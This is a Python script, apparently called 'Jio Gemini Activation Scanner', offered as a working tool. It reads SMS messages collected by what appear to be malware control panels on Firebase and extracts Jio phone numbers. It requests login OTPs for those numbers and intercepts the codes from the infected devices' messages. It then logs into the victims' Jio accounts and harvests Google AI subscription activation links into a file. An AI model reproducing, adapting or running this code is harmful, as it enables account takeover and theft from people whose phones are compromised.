"""
Jio Gemini Activation Scanner
Flow: All Panels -> Online Devices -> Unique Numbers -> Then Process Links
"""
from __future__ import annotations
import csv
import html
import re
import sys
import time
from collections import Counter, defaultdict
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fix Windows console encoding for Unicode output
if sys.stdout.encoding and sys.stdout.encoding.lower() not in {"utf-8", "utf8"}:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent

PANELS_FILE = BASE_DIR / "panels.txt"
LINKS_FILE = BASE_DIR / "gemini_activation_links.txt"
RESULTS_FILE = BASE_DIR / "gemini_results.csv"

def load_panels(path: str | None = None) -> list[tuple[str, str]]:
    """Load Firebase panels from external text file."""
    file_path = Path(path) if path else PANELS_FILE
    if not file_path.exists():
        print(f"Panels file not found: {file_path}")
        return []
    
    panels: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    
    with file_path.open(encoding="utf-8") as handle:
        for lineno, raw_line in enumerate(handle, start=1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            
            # Format: url|api_key  (api_key is optional)
            parts = line.split("|", 1)
            base_url = clean_firebase_url(parts[0])
            key = clean_firebase_key(parts[1]) if len(parts) > 1 else ""
            
            if not base_url or ("firebaseio.com" not in base_url and "firebasedatabase.app" not in base_url):
                continue
            
            entry = (base_url, key)
            if entry in seen:
                continue
            seen.add(entry)
            panels.append(entry)
    
    return panels

MESSAGE_SCAN_LIMIT = 150
OTP_TIMEOUT = 20
POLL_INTERVAL = 1

LINKS_FILE = Path("gemini_activation_links.txt")
RESULTS_FILE = Path("gemini_results.csv")

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number",
    "device_id",
    "mobile_number",
    "status",
    "activation_url",
    "nepal_date",
    "nepal_time",
)

# ==================== TIMEZONE HANDLING ====================
def get_nepal_time() -> tuple[str, str]:
    """Get Nepal time without requiring tzdata"""
    utc_now = datetime.now(timezone.utc)
    nepal_offset = timedelta(hours=5, minutes=45)
    nepal_time = utc_now + nepal_offset
    return nepal_time.strftime("%Y-%m-%d"), nepal_time.strftime("%I:%M:%S %p")

# ==================== URL CLEANUP ====================
def clean_firebase_url(url: str) -> str:
    """Clean Firebase URL by removing spaces and invalid characters"""
    url = url.strip()
    url = url.replace(" ", "")
    if not url.startswith("https://"):
        url = "https://" + url
    return url

def clean_firebase_key(key: str) -> str:
    """Clean Firebase key by removing spaces and invalid characters"""
    key = key.strip()
    key = key.replace(" ", "")
    if key.startswith("http"):
        return ""
    return key

# ==================== RETRY MECHANISM ====================
def firebase_get_with_retry(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None, max_retries: int = 3) -> Any:
    """Firebase GET with retry logic"""
    query = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)
    
    for attempt in range(max_retries):
        try:
            response = session.get(
                f"{base_url}/{path.strip('/')}.json",
                params=query,
                timeout=20
            )
            response.raise_for_status()
            return response.json()
        except (requests.RequestException, ValueError):
            if attempt == max_retries - 1:
                raise
            time.sleep(1 * (attempt + 1))

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    """Firebase GET with proper error handling"""
    try:
        return firebase_get_with_retry(session, base_url, key, path, params)
    except Exception as e:
        print(f"Firebase error: {e}")
        return {}

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    """Get latest messages for a device"""
    try:
        data = firebase_get(
            session, base_url, key, f"messages/{device_id}",
            {"orderBy": '"$key"', "limitToLast": max(1, limit)}
        )
        if not isinstance(data, dict):
            return {}
        return {name: value for name, value in data.items() if isinstance(value, dict)}
    except Exception:
        return {}

def normalize_mobile(value: Any) -> str | None:
    """Normalize mobile number to 10 digits"""
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    """Extract number candidates from messages"""
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def firebase_session() -> requests.Session:
    """Create a Firebase session"""
    session = requests.Session()
    session.headers.update({
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    return session

def jio_session() -> requests.Session:
    """Create a Jio session"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    """Parse response as JSON"""
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    """Check if response indicates error"""
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    """Check if number is a Jio number"""
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    """Send OTP to mobile number"""
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    """Verify OTP"""
    try:
        response = session.post(
            VERIFY_OTP_URL,
            json={"mobileNumber": mobile, "otp": otp},
            timeout=20
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    """Get message order"""
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str, otp_timeout: int = OTP_TIMEOUT, poll_interval: int = POLL_INTERVAL) -> bool:
    """Wait for OTP message and verify it"""
    used: set[str] = set()
    deadline = time.monotonic() + otp_timeout
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(poll_interval)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(poll_interval)
    return False

def activation_url(value: str) -> str:
    """Extract activation URL from text"""
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    """Check if already active or subscription link already used"""
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed", "already in use",
        "subscription already", "link has already been used",
        "already used"
    ))

def api_message(data: dict[str, Any]) -> str:
    """Extract API message"""
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    """Get activation URL"""
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

def save_link(url: str) -> None:
    """Save activation link to file"""
    if not url:
        return
    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in existing:
        return
    with LINKS_FILE.open("a", encoding="utf-8") as handle:
        handle.write(url + "\n")

def save_result(serial: int, device_id: str, mobile: str, status: str, url: str) -> None:
    """Save result to CSV with Nepal time"""
    nepal_date, nepal_time = get_nepal_time()
    
    exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
    with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({
            "serial_number": serial,
            "device_id": device_id,
            "mobile_number": mobile,
            "status": status,
            "activation_url": url,
            "nepal_date": nepal_date,
            "nepal_time": nepal_time,
        })

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Jio Gemini Activation Scanner")
    parser.add_argument("--panels", type=str, default=str(PANELS_FILE), help="Path to panels.txt")
    parser.add_argument("--limit", type=int, default=0, help="Max panels to process (0 = all)")
    parser.add_argument("--skip", type=int, default=0, help="Skip first N panels")
    parser.add_argument("--message-limit", type=int, default=MESSAGE_SCAN_LIMIT, help="Messages per device")
    parser.add_argument("--otp-timeout", type=int, default=OTP_TIMEOUT, help="OTP wait timeout (seconds)")
    parser.add_argument("--poll-interval", type=int, default=POLL_INTERVAL, help="Polling interval (seconds)")
    return parser.parse_args()

def main() -> int:
    args = parse_args()
    
    # Apply overrides
    message_limit = args.message_limit
    otp_timeout = args.otp_timeout
    poll_interval = args.poll_interval
    
    print("=" * 70)
    print("STEP 1: Loading panels...")
    print("=" * 70)
    
    valid_panels = load_panels(args.panels)
    if args.skip:
        valid_panels = valid_panels[args.skip:]
    if args.limit:
        valid_panels = valid_panels[: args.limit]
    print(f"Panels to scan: {len(valid_panels)}")
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    
    def scan_panel(panel_idx: int, base_url: str, firebase_key: str) -> tuple[int, str, dict[str, dict[str, Any]]]:
        firebase = firebase_session()
        try:
            clients = firebase_get(firebase, base_url, firebase_key, "clients")
            if not isinstance(clients, dict):
                return panel_idx, base_url, {}
            devices: dict[str, dict[str, Any]] = {}
            for device_id, data in clients.items():
                if isinstance(data, dict) and data.get("status") is True:
                    devices[device_id] = {
                        "base_url": base_url,
                        "firebase_key": firebase_key,
                        "firebase_session": firebase,
                        "data": data,
                    }
            return panel_idx, base_url, devices
        except Exception as e:
            return panel_idx, base_url, {"__error__": str(e)}
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(scan_panel, idx, url, key): idx
            for idx, (url, key) in enumerate(valid_panels, start=1)
        }
        for future in as_completed(futures):
            panel_idx, base_url, devices = future.result()
            if "__error__" in devices:
                print(f"\nPanel {panel_idx}/{len(valid_panels)}: {base_url}")
                print(f" -> Error: {devices['__error__']}")
            else:
                online_count = len(devices)
                if online_count:
                    print(f"\nPanel {panel_idx}/{len(valid_panels)}: {base_url}")
                    print(f" -> Online devices: {online_count}")
                all_online_devices.update(devices)
    
    print(f"\nTotal Online Devices from all panels: {len(all_online_devices)}")
    if not all_online_devices:
        print("No Online Devices Found.")
        return 1
    
    print("\n" + "=" * 70)
    print("STEP 2: Scanning messages and collecting UNIQUE numbers...")
    print("=" * 70)
    
    def scan_device(device_id: str, info: dict[str, Any]) -> tuple[str, dict[str, dict[str, Any]], set[str]]:
        messages = latest_messages(
            info["firebase_session"],
            info["base_url"],
            info["firebase_key"],
            device_id,
            message_limit,
        )
        mobiles = number_candidates(messages)
        return device_id, messages, mobiles
    
    mappings: dict[str, set[str]] = defaultdict(set)
    total_devices = len(all_online_devices)
    scanned = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(scan_device, device_id, info): device_id
            for device_id, info in all_online_devices.items()
        }
        for future in as_completed(futures):
            device_id, messages, mobiles = future.result()
            device_messages[device_id] = messages
            for mobile in mobiles:
                mappings[mobile].add(device_id)
            scanned += 1
            if scanned % 15 == 0 or scanned == total_devices:
                print(f"Scanned: {scanned}/{total_devices}")
    
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))
    
    print(f"\nTotal Unique Number Candidates: {len(targets)}")
    if not targets:
        print("No Numbers Found.")
        return 1
    
    print("\n" + "=" * 70)
    print("STEP 3: Starting OTP + Activation on all unique numbers...")
    print("=" * 70)
    
    jio = jio_session()
    statuses: Counter[str] = Counter()
    try:
        for serial, (device_id, mobile) in enumerate(targets, start=1):
            info = all_online_devices.get(device_id)
            if not info:
                continue
            
            print(f"\n[{serial}/{len(targets)}] Device: {device_id} | ending: {mobile[-4:]}")
            base_url = info["base_url"]
            firebase_key = info["firebase_key"]
            firebase = info["firebase_session"]
            device = info["data"]
            
            if not isinstance(device, dict) or device.get("status") is not True:
                status, url = "device_offline", ""
            else:
                if not is_jio_number(jio, mobile):
                    status, url = "not_jio_number", ""
                else:
                    known_keys = set(device_messages.get(device_id, {}))
                    if not send_otp(jio, mobile):
                        status, url = "otp_send_failed", ""
                    elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile, otp_timeout, poll_interval):
                        status, url = "otp_failed", ""
                    else:
                        status, url = get_activation(jio)
            
            statuses[status] += 1
            save_link(url)
            save_result(serial, device_id, mobile, status, url)
            print(f"Status: {status}")
            if url:
                print(f"LINK -> {url}")
    except KeyboardInterrupt:
        print("\n\nInterrupted by user. Saving partial results...")
    
    print("\n" + "=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print(f"Total Online Devices : {len(all_online_devices)}")
    print(f"Unique Numbers : {len(targets)}")
    for status, count in sorted(statuses.items()):
        print(f"{status:25}: {count}")
    print(f"\nLinks file : {LINKS_FILE.resolve()}")
    print(f"Results file : {RESULTS_FILE.resolve()}")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())